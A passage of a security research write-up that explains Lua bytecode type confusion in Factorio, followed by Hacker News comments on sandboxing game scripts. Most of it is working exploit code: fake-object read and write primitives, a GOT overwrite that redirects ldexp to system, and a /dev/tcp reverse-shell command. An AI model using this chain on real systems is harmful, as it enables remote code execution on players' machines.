upvalue to point to a different offset of the stack? Let’s try it, first we define a function that has three upvalues function() local foo local bar local target (function() print(foo) print(bar) print(target) end)() end If we execute the code without any modification to the bytecode, we get nil as the output, as the upvalues haven’t been assigned any value yet [MemoryCorruption src]$ ./lua poc.lua nil nil nil Now we are going to manipulate the index of the target upval. To do this, we need to know its current position: The _ENV upvalue is used to get the address of the print function, and is not important for our purposes upvalues (4) for 0xd587a0:0 _ENV 0 01 foo 1 02 bar 1 13 target 1 2 As it is currently 2, we are going to increase it to 3. We can do that with this code: poc = string.dump(function() local foo local bar local target (function() print(foo) print(bar) print(target) end)() end) -- Modify upvalue index of target to be idx + 1 poc = poc:gsub(\"(\\x00\\x00\\x01\\x00\\x01\\x01\\x01)\\x02\", \"%1\\x03\", 1) poc = load(poc) poc() Here we dump the bytecode of the function with string.dump and then modify the index of the last upvalue with a substitution. We use \"(\\x00\\x00\\x01\\x00\\x01\\x01\\x01)\\x02\" as the pattern because each upvalue has one byte to indicate if it is located in the stack and another to indicate the index, making it unique enough for our purpose. Execution of the manipulated bytecode reveals something interesting: [MemoryCorruption src]$ ./lua poc.lua nil nil LClosure: 0x7a6d00 An unmodified version of Lua will return function instead of LClosure, as the default print function considers closures functions Instead of nil, we got an LClosure, but what is an LClosure? To understand it, we need to know how functions work in Lua Closures and Prototypes Prototypes are created when loading bytecode or when parsing the source code of a Lua script. As such, we could say that prototypes are the real functions, as they contain all the information we would commonly associate with a function, like its bytecode, the start and end line of source code where it was defined, constants used… They act kinda as a template for functions typedef struct Proto { CommonHeader; TValue *k; /* constants used by the function */ Instruction *code; struct Proto **p; /* functions defined inside the function */ int *lineinfo; /* map from opcodes to source lines (debug information) */ LocVar *locvars; /* information about local variables (debug information) */ Upvaldesc *upvalues; /* upvalue information */ union Closure *cache; /* last created closure with this prototype */ TString *source; /* used for debug information */ int sizeupvalues; /* size of 'upvalues' */ int sizek; /* size of `k' */ int sizecode; int sizelineinfo; int sizep; /* size of `p' */ int sizelocvars; int linedefined; int lastlinedefined; GCObject *gclist; lu_byte numparams; /* number of fixed parameters */ lu_byte is_vararg; lu_byte maxstacksize; /* maximum stack used by this function */ } Proto; On the other hand, Closures are created during execution of the Lua script and associate a Prototype with its Upvalues. typedef struct LClosure { ClosureHeader; struct Proto *p; /* Function associated with the LClosure */ UpVal *upvals[1]; /* list of upvalues */ } LClosure; The existence of Closures is what allows Lua to implement upvalues, as they abstract a function from its upvals. This is important as the same function can have different upvals on each call We can see this mechanism in work with a function that returns a counter: function createCounter() -- On each call, a new local variable is created local count = 0 return function () -- Count is an upval of this function count = count + 1 return count end end first_counter = createCounter() second_counter = createCounter() -- Increase the first counter print(\"Counter 1: \" .. first_counter()) -- Increase the second counter print(\"Counter 2: \" .. second_counter()) In this code, the createCounter function returns a new function that can be used to increase an upvalue of the createCounter function. As a new count variable is created on each call, the function will return a different LCLosure when called. The same prototype will be used, as they are the same funcion, but a different upval will be associated with it 9 Wait, is all TValues? By modifying the index of the upvalue, we got a reference to the current function closure, that is because LClosures are pushed to the stack on creation and just before upvalues are asigned to it. /* ** create a new Lua closure, push it in the stack, and initialize ** its upvalues. */ static void pushclosure (lua_State *L, Proto *p, UpVal **encup, StkId base, StkId ra) { int nup = p->sizeupvalues; Upvaldesc *uv = p->upvalues; int i; Closure *ncl = luaF_newLclosure(L, nup); ncl->l.p = p; setclLvalue(L, ra, ncl); /* anchor new closure in stack */ for (i = 0; i l.upvals[i] = luaF_findupval(L, base + uv[i].idx); else /* get upvalue from enclosing function */ ncl->l.upvals[i] = encup[uv[i].idx]; } luaC_barrierproto(L, p, ncl); p->cache = ncl; /* save it on cache for reuse */ } The position of the LClosure in the stack depends on the opcode CLOSURE, which as the name indicates, is reponsible for the creation of closures in Lua and is defined as: R(A) := closure(KPROTO[Bx]) This basically means to create a new Closure based on the prototype at position Bx of the current function prototype array of prototypes (function prototypes are stored in the prototype of the function that defined it), and store it at position R(A), which is a macro that means base + A, so at an offset from the current function stack (which seems to always be just after the local variables). This explains why when we modified the index of the last upval we got the LClosure of the function function (4 instructions at 0x225b540) 0 params, 4 slots, 1 upvalue, 3 locals, 0 constants, 1 function1 [19] LOADNIL0 22 [28] CLOSURE3 0 ; 0x225bc803 [22] CALL3 1 14 [29] RETURN0 1 constants (0) for 0x225b540: locals (3) for 0x225b540:0 foo 2 51 bar 2 52 target 2 5 upvalues (1) for 0x225b540:0 _ENV 0 0 As our function had three locals, the CLOSURE opcode has 3 as the A parameter, meaning that the LClosure is stored at base + 3. When we modified the last upval to point to the index 3, we got the TValue stored at base + 3, that is, the LClosure. As closures are first class citizens in Lua, they are also a TValue, so they are no more especial than any other variable. TOCTOU: Type of Check != Type of Use We just learned that Closures are like any other variable in Lua. This arises a question, what prevents a user from calling a variable like a string as a function and crash Lua? The answer, as you can imagine, is a type check when trying to call a TValue int luaD_precall (lua_State *L, StkId func, int nresults) { lua_CFunction f; CallInfo *ci; int n; /* number of arguments (Lua) or returns (C) */ ptrdiff_t funcr = savestack(L, func); switch (ttype(func)) { case LUA_TLCF: /* light C function */ f = fvalue(func); goto Cfunc; case LUA_TCCL: { /* C closure */ /* Redacted */ return 1; } case LUA_TLCL: { /* Lua function: prepare its call */ /* Redacted */ return 0; } default: { /* not a function */ func = tryfuncTM(L, func); /* retry with 'function' tag method */ return luaD_precall(L, func, nresults); /* now it must be a function */ } } } This seems like a banal question, but it has implicit consequences, if the type of the TValue was checked before being able to call it, as it makes sense to do, why would they check the type during execution of the function? What happens if we replace the LClosure with other type of TValue? Are there type checks to prevent this? Let’s experiment with this idea and replace the LClosure with a String poc = string.dump(function() local foo local bar local target (function() print(foo) print(bar) print(target) target = \"AAAAAAAAAAAAAAAA\" -- Replace LClosure with String print(target) end)() end) -- Modify upvalue index of target to be idx + 1 poc = poc:gsub(\"(\\x00\\x00\\x01\\x00\\x01\\x01\\x01)\\x02\", \"%1\\x03\", 1) poc = load(poc) poc() Not much seems to happen: [MemoryCorruption src]$ ./lua ~/Downloads/lua-5.2.1/src/poc.lua nil nil LClosure: 0x1c57e20 AAAAAAAAAAAAAAAA Why is that? As we are not calling any other function after overwritting the LClosure, its value is not being used. But what happens if we corrupt the previous LClosure? How does that affect the execution when Lua returns to the function? Let’s see it poc = string.dump(function() local foo local bar local target (function() -- [1] target points to this function LClosure (function() print(foo) print(bar) print(target) -- [2] The inner function overwrites the outer function LClosure target = \"AAAAAAAAAAAAAAAA\" -- [3] Lua returns to the corrupted LClosure end)() end)() end) -- Modify upvalue index of target to be idx + 1 poc = poc:gsub(\"(\\x00\\x00\\x01\\x00\\x01\\x01\\x01)\\x02\", \"%1\\x03\", 1) poc = load(poc) poc() This time the inner function is overwritting the LClosure of the outer function instead of modiying their own LClosure [MemoryCorruption src]$ ./lua poc.lua nil nil LClosure: 0x21b1130 Segmentation fault (core dumped) We can see in GDB that the crash happens because Lua is trying to use our TValue as a LClosure in the change of frame code ──[ REGISTERS ] *RAX 0x4141414141414141 ('AAAAAAAA') ──[ DISASM ] ► 0x419d17mov rax, qword ptr [rax + 0x10] ──[ SOURCE ] In file: lua-5.2.1/src/lvm.c 604 TValue *k; 605 StkId base; 606 newframe: /* reentry point when frame changes (call/return) */ 607 lua_assert(ci == L->ci); 608 cl = clLvalue(ci->func); ► 609 k = cl->p->k; 610 base = ci->u.l.base; 611 /* main loop of interpreter */ 612 for (;;) { 613 Instruction i = *(ci->u.l.savedpc++); 614 StkId ra; These are great news, as now the cl variable, that points to the current LClosure in execution, is pointing to our TString and not to the real LClosure. This is possible because the type check in the return opcode is not enforced. Instead of forcing a type check, like in the luaD_precall function before a call, the lua_assert macro is used, and as we learned before, it does nothing by default vmcasenb(OP_RETURN, int b = GETARG_B(i); if (b != 0) L->top = ra+b-1; if (cl->p->sizep > 0) luaF_close(L, base); b = luaD_poscall(L, ra); if (!(ci->callstatus & CIST_REENTRY)) /* 'ci' still the called one */ return; /* external invocation: return */ else { /* invocation via reentry: continue execution */ ci = L->ci; if (b) L->top = ci->top; // This type check would prevent this type confusion, // but is disabled by default lua_assert(isLua(ci)); lua_assert(GET_OPCODE(*((ci)->u.l.savedpc - 1)) == OP_CALL); goto newframe; /* restart luaV_execute over new Lua function */ } ) To understand how we can leverage this, we first need to know what attributes we are in control of when we confuse a TString with a LClosure Bytes LClosure TString 0-7 GCObject *next GCObject *next 8 lu_byte tt lu_byte tt 9 lu_byte marked lu_byte marked 10 lu_byte nupvalues lu_byte extra 11-15 Padding Padding + unsigned int hash 16-23 GCObject *gclist size_t len 24-31 Proto *p start of user content 32-40 Upval **upval rest of string As we can see, the type confusion gives us total control of both the Proto and Upval pointers, as the user content of a string is stored in those offsets. This is important because we gain control over the pointer to the function prototype and the array of upvalues of the current frame. If we point these pointers to an area of memory we control, for example, another string, we could create fake objects, the most powerful primitive in a dynamic language. Creating Fake Objects From this point, there are two paths, we either create a Fake Proto that points to an array of fake TValues, or we can create a fake UpVal array that points to our TValues. They lead to the same outcome, so I recomment following the Constants path, as you need less padding, and also regain the ability to use constants in your function, which is nice Possible paths to create Fake Objects from a LClosure we control Let’s start by creating a fake string. Fake strings are interesting as they can be used as a read primitive by creating a one with the max length possible. This is useful in many cases and can even be the end goal of our exploit (as we might just want to demonstrate access to customer data in memory) As we will follow the path of constants, we need to create: The Fake String An array of TValues, with one pointing to our fake string A Fake Proto that points to the Array of TValues A Fake LClosure that points to our fake Proto 1. Fake String In Lua, strings are represented with the TString union: While crafting fake objects, use the definition of the structure provided by GDB, as it includes paddings pwndbg> ptype /o TString type = union TString { /* 8 */ L_Umaxalign dummy; /* 24 */ struct { /* 08 */ GCObject *next; /* 81 */ lu_byte tt; /* 91 */ lu_byte marked; /* 101 */ lu_byte extra; /* XXX 1-byte hole */ /* 124 */ unsigned int hash; /* 168 */ size_t len; /* total size (bytes): 24 */ } tsv; /* total size (bytes): 24 */ } As our goal is to create a string with an arbitrary len, our string will have 24 bytes where the last 8 bytes represent the length of our string -- Convert little endian uint64 to char[8] local function ub8(n) local t = {} for i = 1, 8 do local b = n % 256 t[i] = string.char(b) n = (n - b) / 256 end return table.concat(t) end -- next + tt/marked/extra/padding/hash + len fakeStr = ub8(0x0) .. ub8(0x0) .. ub8(0x1337) 2. Fake Array of TValues Next, we need to create the TValue that points to this TString, as we already know, TValues have two parts, the Value and the type pwndbg> ptype /o TValue type = struct lua_TValue { /* 08 */ Value value_; /* 84 */ int tt_; /* XXX 4-byte padding */ /* total size (bytes): 16 */ } So we have to create a string with two 64 bit values, the first will be a pointer to the fake TString we created before, and the second the type of the TValue Remember that a TString has a header of 24 bytes before the user data, so we need to take that into account while calculating pointers to the content of the string -- Value + Type (LUA_TSTRING = 4) fakeTValueArray = ub8(addr_of(fakeStr) + 24) .. ub8(4) If we wanted to add another fake object, we just have to concat it as this is supposed to be an array of TValues -- Value + Type (LUA_TSTRING = 4) / Value + Type (LUA_TNUMBER = 3) fakeTValueArray = ub8(addr_of(fakeStr) + 24) .. ub8(4) .. ub8(0) .. ub8(3) 3. Fake Proto Then we need to create a Fake Proto that points to our fake array of TValues pwndbg> ptype /o Proto type = struct Proto { /* 08 */ GCObject *next; /* 81 */ lu_byte tt; /* 91 */ lu_byte marked; /* XXX 6-byte hole */ /* 168 */ TValue *k; /* 248 */ Instruction *code; /* 328 */ struct Proto **p; /* 408 */ int *lineinfo; /* 488 */ LocVar *locvars; /* 568 */ Upvaldesc *upvalues; /* 648 */ union Closure *cache; /* 728 */ TString *source; /* 804 */ int sizeupvalues; /* 844 */ int sizek; /* 884 */ int sizecode; /* 924 */ int sizelineinfo; /* 964 */ int sizep; /* 1004 */ int sizelocvars; /* 1044 */ int linedefined; /* 1084 */ int lastlinedefined; /* 1128 */ GCObject *gclist; /* 1201 */ lu_byte numparams; /* 1211 */ lu_byte is_vararg; /* 1221 */ lu_byte maxstacksize; /* XXX 5-byte padding */ /* total size (bytes): 128 */ } In our case, as we are only interested in controlling the k pointer (the pointer to the constants), we can do this: -- Fake proto that points the constants array fakeProto = ub8(0x0) .. ub8(0x0) .. ub8(addr_of(fakeTValueArray) + 24) 4. Fake LClosure Finally, we create a fake LClosure that points to our fake Proto structure. As the user content of a string perfectly aligns with the location of the Proto pointer in a real LClosure, creating it is straighforward: fakeClosure = ub8(addr_of(fakeProto) + 24) With this fake LClosure, we now have all the parts needed to craft an object. We will update the code that replaces the LClosure with the following that also returns the crafted object craft_object = string.dump(function(closure) local target return (function(closure) -- [1] target points to this function LClosure (function(closure) -- [2] The inner function overwrites the outer function LClosure target = closure end)(closure) -- [3] The LOADK opcode reads the constant -- from our fake LCLosure array of constants, -- so instead of 42 this returns our fake object return 42 -- We need to return an additional value to prevent a TAILCALL -- that would mess up with the Call frame end)(closure), 1337 end) -- Replace the stack index of target upval to point to the LCLosure -- of the first function craft_object = craft_object:gsub(\"(target\\x00\\x01\\x00\\x00\\x00\\x01)\\x01\", \"%1\\x02\", 1) craft_object = load(craft_object) Notice how we both return the result of the inner function (the crafted object) and a constant 1337. We do this because when doing return function(), Lua uses a TAILCALL opcode to do the call. This opcode allows infinite recursion without growing the stack, as the current call frame will be used for the inner function. This is not what we want, the change of frame needs to happen so our fake LClosure gets used as the current frame. By also returning a constant we prevent Lua from using a TAILCALL operation, forcing a change of frame. With this updated piece of code, we just have to call the craft_object primitive with our fake LCLosure to obtain our fake object. read_primitive = craft_object(fakeClosure) print(string.format(\"Size of string: %x\", #read_primitive)) --Output: Size of string: 1337 The Tables Have Turned From this point, with the ability to create fake objects, all the features of Lua are now your weapons: TStrings: allow to leak data Tables: can be used to write data to arbitrary addresses CCLosure/Light C Functions: allow to obtain control of the instruction pointer. Which has multiple uses: Bypass sandboxes: we can recover access to Lua functions that might be sandboxed but still present in the binary by pointing a fake function to its address Execute ROP Chains: as we control the instruction pointer, we can execute ROP chains The path to take will depend both on your goals and the application where Lua is embedded. Generic Primitives Finishing our read primitive Previously, we created our first fake object, a TString. We already said that this is a powerful fake object, as it can be used to leak data, so let’s finish building this read primitive. To do this, we start by updating the size of our fake string from 0x1337 to a bigger number, so we can reach more data from its position. -- next + tt/marked/extra/padding/hash + len fakeStr = ub8(0x0) .. ub8(0x0) .. ub8(0x20000000000000) Now, we need to create a function that given a fake string, tries to read from an address we provide. As we already know, Lua assumes that the string is located after the TString header, that means that we are limited to leaking data after the header. As TStrings are located in the heap, we will only be able to read data located in the heap or after it. The following code can be used to read data from an address we provide given a fake string that is within reach of the target: In Lua, Strings are indexed starting from 1. This means that str:sub(0, 1) and str:sub(1, 1) return the same character. To take that into account we will consider the header of the TString one byte smaller function read(fake_string, addr, size) -- First we calculate if the address is reachable from our position local relative_addr = addr - (addr_of(fake_string) + 23) if relative_addrptype /o UpVal type = struct UpVal { /* 08 */ GCObject *next; /* 81 */ lu_byte tt; /* 91 */ lu_byte marked; /* XXX 6-byte hole */ /* 168 */ TValue *v; /* 2416 */ union { /* 16 */ TValue value; /* 16 */ struct { /* 248 */ struct UpVal *prev; /* 328 */ struct UpVal *next; /* total size (bytes): 16 */ } l; /* total size (bytes): 16 */ } u; /* total size (bytes): 40 */ } That means the following code: -- next/tt/marked + Address of the TValue (v) fakeUpVal = \"AAAABBBBCCCCDDDD\".. ub8(addr) Then, is just a matter of creating a fake LClosure where we control the UpVals array -- proto + upvals fakeClosure = ub8(addr_of(\"MemoryCorruption\")) .. ub8(addr_of(fakeUpVal) + 24) Our primitive will be like the following: function write(addr, value) -- The Fake Upval points to the destination of the write fakeUpVal = \"AAAABBBBCCCCDDDD\".. ub8(addr) -- next/tt/marked + v -- Fake closure that we use to overwrite the real closure fakeClosure = ub8(addr_of(\"MemoryCorruption\")) .. ub8(addr_of(fakeUpVal) + 24) -- proto + upvals write_primitive(fakeClosure, value) end write(0x4545454545, 0x5050505050) With these changes, we now have an arbitrary write primitive. However, floating-point numbers strike again… Program received signal SIGSEGV, Segmentation fault. 0x000000000041a267 in luaV_execute (L=0x43e2a0) at lvm.c:662 *RAX 0x4545454545 RBX 0 RCX 1 *RDX 0x4254141414140000 ───────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────────── ► 0x41a267mov qword ptr [rax], rdx 0x41a26amov rax, qword ptr [rbp - 0x338] 0x41a271mov edx, dword ptr [rax + 8] 0x41a274mov rax, qword ptr [rbp - 0x340] 0x41a27bmov dword ptr [rax + 8], edx Episode V - Doubles Strike Back Now we have the opposite problem to the one we explained at IEEE-754 Double-precision . We have a double that we want to transform into an integer. As we already know, Lua only uses doubles, so we have to play with the encoding of doubles to obtain the binary representation that we are looking for In this case, there is an easy reasoning to obtain this transformation. We are gonna assume that we only want to write values that fit the mantissa of a double, as its not that useful to write incorrect data. That means that we want an exponent full of zeroes. As we already know, that is an especial value in floating-point numbers that means that it is a denormalized number, that is, a very small number. What is the smallest number we can have? In the case of denormalized numbers, the value of a double is calculated as follows: (-1)**sign * 2**(1-1023) * 0.mantissa = (-1)**sign * 2**-1022 * 0.mantissa So it basically is 2**-1022 * smallest_mantissa_possible. What is the smallest mantissa possible? As we have 52 bits of precision, that would be 2**-52. So that means that the smallest number representable is: (-1)**sign * 2**-1022 * 2**-52 = (-1)**sign * 2**-1074 We can check this with the same Python code we used to convert from double to integer Exponent: 00000000000 Mantissa: 0000000000000000000000000000000000000000000000000001 Number: 0x1 As expected, the exponent is zero, as it is a denormalized number, and only the last bit is set, so it is the smallest representable number. All this means that if we multiply our double with this value, we will get a double representation that encodes our number in the same way as an integer. double = 0x50505050 * 2**-1074 double_bytes = struct.pack(' mov qword ptr [rax], rdx 0x41a26amov rax, qword ptr [rbp - 0x338] 0x41a271mov edx, dword ptr [rax + 8] 0x41a274mov rax, qword ptr [rbp - 0x340] 0x41a27bmov dword ptr [rax + 8], edx Controlling the Instruction Pointer Another generic primitive that will be useful in most cases is the ability to control the instruction pointer. To do this, we can either fake a CClosure or a Light C Function. In this case, we are going to use a Light C Function, because this also reveals a useful leak that we don’t know yet. The difference between both is that a CCLosure can have upvalues, while a Light C Function can not. As seen in the code, a light function is a variant of the function type and has value 22. #define LUA_TFUNCTION6 #define LUA_TLCF (LUA_TFUNCTION(10x289c130 However, we instead got: 0xa.2704c00000000p-1052 -> 0xfe32704c00000000 This completely breaks the code we made. Maybe depending on libraries was not a great idea. Now that we have a better understanding of doubles, let’s write a completely numeric approach, like is done in other writeups 12 As we know, 2^-1074 is the smallest number possible, as it is a denormalized number with only the last bit set Exponent: 00000000000 Mantissa: 0000000000000000000000000000000000000000000000000001 We used this to force a representation of an integer in a double, but we can actually do the opposite operation. Let’s see it with an example. Imagine we leak the pointer 0x289c130 using our leak primitive, if we try to print it, we get the value 2.1038461432219e-316, how can we get the original number? The trick is in understanding that in denormalized form, the position of the bits in the mantissa matter, as bits to the right represent smaller numbers. This is why even if all pointers are integers, they don’t have the same exponent when considered a double, as the position of the rightmost bit changes Exponent 00000000000 Mantissa: 0000000000000000000000000010100010011100000100110000 This behaviour can make us think that the operation we need to do depends on the exponent provided by Lua, while in reality it does not matter at all. Think about it, no matter the integer, the value always starts at the rightmost bit, so in reality, we can consider all integers to have exponent -1074 when represented as a double, which is exactly what we did in the oppsite operation. So all this means that by doing leak * 2**1074 we can recover the original number We have to split the multiplication in two parts as 2**1074 is not representable as a double (remember that the highest exponent is 1023) function double_to_number(double) return double * 2^52 * 2^1022 end You can also see it in the following way: the first multiplication makes sure the number is no longer denormalized, as they are represented in the mantissa, which has 52 bits, while the second multiplication makes the exponent positive, as the smallest negative exponent in a normal number is -1022. After doing this, the double now properly encodes the integer leaked 1. Function to replace with System Now that our primitives work in Factorio, let’s finally get to RCE. First, for our idea to work, we need an imported function that we can call from Lua for which we control the first parameter. The Lua version in Factorio is pretty limited in terms of available libraries, but fortunately, the math library has a perfect example of this at math_ldexp static int math_ldexp (lua_State *L) { lua_pushnumber(L, l_tg(ldexp)(luaL_checknumber(L, 1), luaL_checkint(L, 2))); return 1; } We can see on gdb that the second parameter is passed as the first parameter (RDI) on the libc call math.ldexp(0, 0x454545454) -- This will call system(0x289c150) Thread 24 \"factorio\" hit Breakpoint 2.3, __ldexp (value=0, exp=1414812756) at ./s_ldexp_template.c:22 22 { LEGEND: STACKHEAPCODEDATARWXRODATA ──────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────────── *RAX 0x160 *RBX 0x7fff9400ded0 ◂— 0x0 *RCX 0x7fff94059660 ◂— 0x0 *RDX 0x7fff94059650 —▸ 0x1ab8ea0 (math_ldexp(lua_State*)) ◂— push rbp *RDI 0x54545454 This makes this function suitable to be replaced with the address of system, as we already know that the command is passed as the first parameter int system(const char *command); 2. Replacing the Address of ldexp with system Now that we found a function that is suitable to be replace with system, we need to overwrite it’s address with the address of system, but to do that, we first need to locate system in memory, as the target has ASLR enabled. This shouldn’t be a problem, right? We have our read primitive. However, there is a small problem, the GOT table is located before the Heap, so our read primitive is unable to leak it, as we can only leak data after our string header. We could search in heap for pointers to libc but that is not as reliable, is there anything we can do to avoid this? Yes, there is. As we also have a write-what-where primitive, why don’t we craft a TString before the GOT table? It should be possible, right? There are two ways to do this, we could search in memory for some data that resembles a TString structure before the GOT that we can use as our fake TString, our we can write our own. In this case, as there is a writable segment before the GOT, we can just use that Type Load Address Perm Section Name ---------------- --------------------------------------- ---- ------------ container [0x0000000000400000-0x000000000289aec0) r-x PT_LOAD[0] regular [0x0000000000400238-0x0000000000400254) r-- interp regular [0x0000000000400254-0x0000000000400274) r-- note.ABI-tag dynamic-symbols [0x0000000000400278-0x00000000004035a8) r-- dynsym regular [0x00000000004035a8-0x0000000000405151) r-- dynstr regular [0x0000000000405158-0x000000000040620c) r-- hash regular [0x000000000040620c-0x0000000000406650) r-- gnu.version regular [0x0000000000406650-0x0000000000406890) r-- gnu.version_r rel-entries [0x0000000000406890-0x00000000004069b0) r-- rela.dyn rel-entries [0x00000000004069b0-0x0000000000409b18) r-- rela.plt code [0x0000000000409b18-0x0000000000409b37) r-x init code [0x0000000000409b40-0x000000000040bc40) r-x plt code [0x000000000040c000-0x00000000020f1f71) r-x text code [0x00000000020f1f74-0x00000000020f1f7d) r-x fini regular [0x00000000020f1f80-0x0000000002491250) r-- rodata regular [0x0000000002491250-0x000000000256d545) r-- gcc_except_table eh-frame [0x000000000256d548-0x000000000280ecf4) r-- eh_frame regular [0x000000000280ecf4-0x000000000289aec0) r-- eh_frame_hdr container [0x000000000289bec0-0x0000000002902f90) rw- PT_LOAD[1] // RW Section before GOT dyn-link-info [0x000000000289bec0-0x000000000289c180) rw- dynamic regular [0x000000000289c180-0x000000000289df00) rw- got regular [0x000000000289df00-0x000000000289ef90) rw- got.pl With our primitives is very straighforward to create this fake string before the GOT and return it as a fake object -- Clear previous fields and write arbitrary len write(0x289c130, 0x0) write(0x289c138, 0x0) write(0x289c140, 0x0) write(0x289c148, 0xfffffffffffffff) -- Here we create a fake TValue that points to our fake TString before the GOT -- Value + Type (LUA_TSTRING = 4) fakeTValue = ub8(0x289c130) .. ub8(4) -- Array of Upvals -- previous + next + tt/marked/padding + v fakeUpVal = ub8(0x0) .. ub8(0x0) .. ub8(addr_of(fakeTValue) + 32) -- Fake proto that points the constants array fakeConstant = ub8(0) .. ub8(3) -- Value + Type (LUA_TNUMBER = 3) -- previous + next + tt/marked/padding + k fakeProto = ub8(0x0) .. ub8(0x0) .. ub8(0x0) .. ub8(addr_of(fakeConstant) + 32) -- Fake closure that we use to overwrite the real closure -- proto + upvals (-8 as in Factorio UpVal has an -- extra pointer that breaks alignment) fakeClosure = ub8(addr_of(fakeProto) + 32) .. ub8(addr_of(fakeUpVal) + 32 - 8) fakeObjects = {} fake = poc(fakeClosure, fakeObjects) -- Replace Closure with our fake TValue print(string.format(\"Size of string: %x\", #fakeObjects[0])) With this, we can easily leak the address of a libc function to bypass ASLR -- Leak pointer from GOT memcpy = ubNumber(read(fakeObjects[0], 0x289df40, 8)) print(\"[*] memcpy addr: 0x\" .. string.format(\"%x\", memcpy)) -- Offsets for LIBC 2.38 (Fedora 39) libc_base = memcpy - 0x138b80 system = libc_base + 0x2a3b0 print(\"[*] LIBC: 0x\" .. string.format(\"%x\", libc_base)) print(\"[*] system: 0x\" .. string.format(\"%x\", system)) After calculating the position of system, we can overwrite the GOT entry with it -- Corrupting ldexp with system address write(0x289ef00, system) print(\"[*] Corrupted ldexp addr\") 3. Executing commands Now that we have a way to call system from Lua code, let’s try to execute a command. We will execute sh -c \"sh -i >& /dev/tcp/127.0.0.1/9001 0>&1 &\" to obtain a remote shell. We can store the command in a Lua string and then call ldexp with this address cmd = 'sh -c \"sh -i >& /dev/tcp/127.0.0.1/9001 0>&1 &\"' math.ldexp(0, addr_of(cmd) + 32) However, we never get a shell, what is happening? We attach gdb to the program and break on the call to system, by doing this, we notice the problem: Lua calls ldexp with a 32 bit parameter, breaking our address *RDI 0x9400f870 *R12 0x7fff9400f870 ◂— 'sh -c \"sh -i >& /dev/tcp/127.0.0.1/9001 0>&1 &\"' Fortunately, we already have a workaround, writing the command in the same segment we used to store the fake string. As PIE is not enabled (which is basically ASLR for the main binary), binary addresses are small enough for this -- Write command sh -c \"sh -i >& /dev/tcp/127.0.0.1/9001 0>&1 &\" write(0x289c150, 0x2d206873) write(0x289c154, 0x73222063) write(0x289c158, 0x692d2068) write(0x289c15C, 0x20263e20) write(0x289c160, 0x7665642f) write(0x289c164, 0x7063742f) write(0x289c168, 0x3732312f) write(0x289c16C, 0x302e302e) write(0x289c170, 0x392f312e) write(0x289c174, 0x20313030) write(0x289c178, 0x31263e30) write(0x289c17C, 0x222620) print(\"[*] Executing shell\") math.ldexp(0, 0x289c150) -- This will call system(0x289c150) This time, our exploit works and we recieve a remote shell [MemoryCorruption /]$ nc -lvp 9001 Ncat: Version 7.93 ( https://nmap.org/ncat ) Ncat: Listening on :::9001 Ncat: Listening on 0.0.0.0:9001 Ncat: Connection from 127.0.0.1. Ncat: Connection from 127.0.0.1:55556. sh-5.2$ whoami whoami victim sh-5.2$ Your Turn After reading this post, I hope you gained a good understanding of how Lua bytecode works and how it can be leveraged. As I think the best way to learn something is by practicing, I made a small challenge in which you have to escape from a Lua interpreter and execute a Javascript function that is not callable by Lua code. You can find it here: Escape from Alcawasm . I hope you have fun! https://lua-users.org/lists/lua-l/2009-03/msg00039.html Wayback Machine copy of the forum thread where the reasons why the bytecode verifier was deprecated ↩︎ Factorio Lua code of the bytecode verifier of Factorio ↩︎ Programming In Lua: Numbers Explaination of how Lua implements Numbers ↩︎ ↩︎ Exploiting a Small Leak in a Great Ship Talk about exploiting Lua bytecode on a Cisco ASA Router that explains common bytecode vulnerabilities ↩︎ Double-Precision floating-point format : Wikipedia entry about doubles, check the section: Precision limitations on integer values ↩︎ Floating-Point Conversions GNU Libc manual entry that explains the output of the %a format string ↩︎ Biased Representation Wikipedia entry about Biased Representation ↩︎ Normal Numbers Wikipedia entry about Normal numbers. It contains a table with the smallest normal number representable in each variant of floating-point numbers ↩︎ Programming in Lua: Closures Explaination of how Lua Closures work ↩︎ Offical Lua Page official implementation of Lua that we used for testing our code ↩︎ Trio - portable and extendable printf and string functions library that seems to be used by Factorio to implement a portable sprintf ↩︎ Exploiting Lua 5.1 on 32-bit Windows Gist about exploiting Lua 5.1 on Windows ↩︎ What is Factorio? How is Lua used in the game? The more the merrier Going Deeper General Exploitation Path A small leak will sink a great ship Who controls the Bytecode controls the future Bytecode Verifier Building Blocks Leaking Addresses Introduction to TValues FORLOOP IEEE 754 double-precision Confusing Upvalues What are Upvalues? The Gift that Keeps on Giving Closures and Prototypes Wait, is all TValues? TOCTOU: Type of Check != Type of Use Creating Fake Objects 1. Fake String 2. Fake Array of TValues 3. Fake Proto 4. Fake LClosure The Tables Have Turned Generic Primitives Finishing our read primitive Building a Write-What-Where Primitive Controlling the Instruction Pointer Getting Remote Code Execution on Linux 0. Integration Hell? It’s not Doubles, There’s no way it’s Doubles, It was Doubles 1. Function to replace with System 2. Replacing the Address of ldexp with system 3. Executing commands Your Turn",
    "commentLink": "https://news.ycombinator.com/item?id=40830005",
    "commentBody": "Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws (memorycorruption.net)226 points by memcorruption 6 hours agohidepastfavorite43 comments CapsAdmin 2 hours agoI wish this was more defined or documented somehow. You're kind of left on your own to figure out whether a language is reasonably guaranteed to be safe or not. Some example scenarios: - Code is static and is executed directly by a user, the default case languages care typically care about. Including Lua. - Code is dynamically fetched and executed through some update process, hopefully only through official channels. Here you can get away by making the process secure, but who knows. - Code can be added by the user through plugins, this can be made easier through stores with the click of a button. You can review plugins, but this is hardly done. Here you need to consider if the code should be sandboxed or the user should be careful. - A multiplayer game where a server can be extended with custom code via plugins, but not the clients. Here you need to consider that the users/gamers who are hosting servers are eager to try many different plugins. The plugin community (gamers) can also be a lot more dangerous. - A multiplayer game where the server can execute arbitrary code on clients, just like a browser. Here you need to be very careful about sandboxing, especially on clients as gamers will just join random servers without thinking about the security implications. The last point being Factorio's case. I'm not necessarily disagreeing that it's the developers job to evaluate this, but sometimes it's not obvious that for example the load function in Lua can run arbitrary bytecode which is unsafe. To be honest, I wasn't aware that Lua's bytecode is unsafe, but I am aware that LuaJIT's bytecode is unsafe. But as far as I know this fact is just stated randomly in the mailing list and github issues as an obvious fact. There is another thing about servers being able to crash clients (just run some infinite loop on them), but this much harder and maybe pointless to avoid. reply hypeatei 2 hours agoparent> A multiplayer game where a server can be extended with custom code via plugins A game called Mordhau (based on Unreal engine) had a built-in \"message of the day\" feature where server owners can put in a URL that loads an in-game browser when the player connects. No client side option existed to disable the browser and I believe the devs eventually disabled it completely but I'm not 